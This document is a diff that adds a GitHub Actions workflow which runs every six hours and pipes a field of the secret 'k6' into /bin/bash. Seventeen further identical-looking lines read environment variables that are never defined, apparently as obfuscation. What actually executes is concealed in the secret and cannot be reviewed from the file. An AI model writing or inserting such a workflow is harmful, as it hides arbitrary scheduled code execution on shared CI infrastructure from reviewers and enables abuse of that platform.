@@ -1,0 +1,35 @@
+name: chengengfuzi
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '39 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: chengengfuzi
+        env:
+          k6: ${{ secrets.k6 }}
+        run: |
+          echo $k6 | jq -r .vmvp04 | /bin/bash
+          echo $yfa24266 | jq -r .d303 | /bin/bash
+          echo $sljc82449 | jq -r .k1 | /bin/bash
+          echo $fi502 | jq -r .ea6 | /bin/bash
+          echo $dg29569 | jq -r .sljz34214 | /bin/bash
+          echo $dxu147 | jq -r .od17 | /bin/bash
+          echo $v39657 | jq -r .izxv41 | /bin/bash
+          echo $b79199 | jq -r .ejy37159 | /bin/bash
+          echo $e001 | jq -r .l0927 | /bin/bash
+          echo $chgq99223 | jq -r .sa36452 | /bin/bash
+          echo $phgbi46 | jq -r .oyepi9 | /bin/bash
+          echo $ef238 | jq -r .nfyxa53918 | /bin/bash
+          echo $ugvwo0249 | jq -r .eukew58479 | /bin/bash
+          echo $ljt61 | jq -r .h9 | /bin/bash
+          echo $j74 | jq -r .axsr2 | /bin/bash
+          echo $ebnpx06831 | jq -r .y7 | /bin/bash
+          echo $uaci928 | jq -r .fc96 | /bin/bash
+          echo $cruz1811 | jq -r .kvp36080 | /bin/bash
+
